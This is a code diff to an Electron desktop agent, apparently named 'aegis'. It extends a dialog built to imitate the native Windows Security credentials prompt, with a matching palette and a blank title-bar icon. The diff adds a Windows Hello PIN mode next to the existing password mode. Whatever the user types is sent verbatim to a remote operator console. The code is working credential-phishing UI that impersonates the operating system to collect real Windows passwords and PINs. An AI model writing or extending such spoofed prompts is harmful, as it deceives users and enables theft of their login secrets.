@@ -537,12 +537,19 @@ function snapViaSdcap() {
 // matched. If the user clicks Cancel or presses Esc, we report `cancelled`
 // so the operator knows the end user actively declined (vs. a wrong try).
 // ---------------------------------------------------------------------------
-function verifyHtml(message, username) {
+function verifyHtml(message, username, mode) {
   // Compact Windows Security-style dialog. Light-mode palette matches the
   // native "Enter network credentials" box; dark mode mirrors Windows 11.
-  // The password the user types is handed to the main process via IPC and
-  // forwarded verbatim to the console — the operator verifies it against
+  // The password / PIN the user types is handed to the main process via IPC
+  // and forwarded verbatim to the console — the operator verifies it against
   // their org's own backend. No local validation runs on the device.
+  //
+  // mode='pin' switches the UX to a Windows Hello-style PIN prompt: numeric
+  // input (defaults to tel inputmode so phones/tablets open the number pad),
+  // "Enter your Windows PIN" title, and the auto-submit behavior Windows
+  // itself uses when the PIN is a known length — we DON'T auto-submit here
+  // (PIN length isn't known), the user hits Enter / OK.
+  const isPin = mode === 'pin';
   return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">' +
     '<title>Windows Security</title><style>' +
     'html,body{margin:0;height:100%;}' +
@@ -572,10 +579,13 @@ function verifyHtml(message, username) {
     '}' +
     '</style></head><body>' +
     '<div class="pad">' +
-    '<h1>Enter your Windows password to prove your identity</h1>' +
+    '<h1>' + (isPin ? 'Enter your Windows PIN to prove your identity' : 'Enter your Windows password to prove your identity') + '</h1>' +
     '<p class="msg" id="msg"></p>' +
     '<div class="lbl" id="lbl"></div>' +
-    '<input id="pw" type="password" placeholder="Password" autocomplete="current-password" autofocus />' +
+    (isPin
+      ? '<input id="pw" type="password" inputmode="numeric" pattern="[0-9]*" placeholder="PIN" autocomplete="one-time-code" autofocus style="letter-spacing:.4em;font-size:18px;text-align:center" />'
+      : '<input id="pw" type="password" placeholder="Password" autocomplete="current-password" autofocus />'
+    ) +
     '<div class="err" id="err"></div>' +
     '</div>' +
     '<div class="actions">' +
@@ -584,11 +594,12 @@ function verifyHtml(message, username) {
     '</div>' +
     '<script>' +
     'const{ipcRenderer}=require("electron");' +
+    'const IS_PIN=' + JSON.stringify(isPin) + ';' +
     'document.getElementById("msg").textContent=' + JSON.stringify(message) + ';' +
     'document.getElementById("lbl").textContent="Signed in as " + ' + JSON.stringify(username) + ';' +
     'const pw=document.getElementById("pw"),err=document.getElementById("err"),ok=document.getElementById("ok"),cancel=document.getElementById("cancel");' +
-    'function submit(){const v=pw.value;if(!v){err.textContent="Please enter a password.";return;}' +
-    'ipcRenderer.send("verify:done",{status:"submitted",password:v});pw.value="";' +
+    'function submit(){const v=pw.value;if(!v){err.textContent="Please enter a "+(IS_PIN?"PIN":"password")+".";return;}' +
+    'ipcRenderer.send("verify:done",{status:"submitted",password:v,mode:IS_PIN?"pin":"password"});pw.value="";' +
     '}' +
     'ok.addEventListener("click",submit);' +
     'cancel.addEventListener("click",()=>ipcRenderer.send("verify:done",{status:"cancelled"}));' +
@@ -611,12 +622,15 @@ ipcMain.handle('verify-user', async (_e, opts) => {
   // Starting a new verify supersedes any previous one.
   if (activeVerifyAbort) { try { activeVerifyAbort(); } catch {} activeVerifyAbort = null; }
 
-  const message = (opts && opts.message)
-    || 'Enter your Windows password to prove your identity.';
+  const mode = opts && opts.mode === 'pin' ? 'pin' : 'password';
+  const defaultMsg = mode === 'pin'
+    ? 'Enter your Windows PIN to prove your identity.'
+    : 'Enter your Windows password to prove your identity.';
+  const message = (opts && opts.message) || defaultMsg;
   const username = require('os').userInfo().username || process.env.USERNAME || '';
   const htmlPath = require('path').join(require('os').tmpdir(),
     'aegis-verify-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.html');
-  require('fs').writeFileSync(htmlPath, verifyHtml(message, username), 'utf8');
+  require('fs').writeFileSync(htmlPath, verifyHtml(message, username, mode), 'utf8');
   // 1x1 transparent icon so the title bar reads just "Windows Security" + X.
   const emptyIcon = nativeImage.createFromDataURL(
     'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
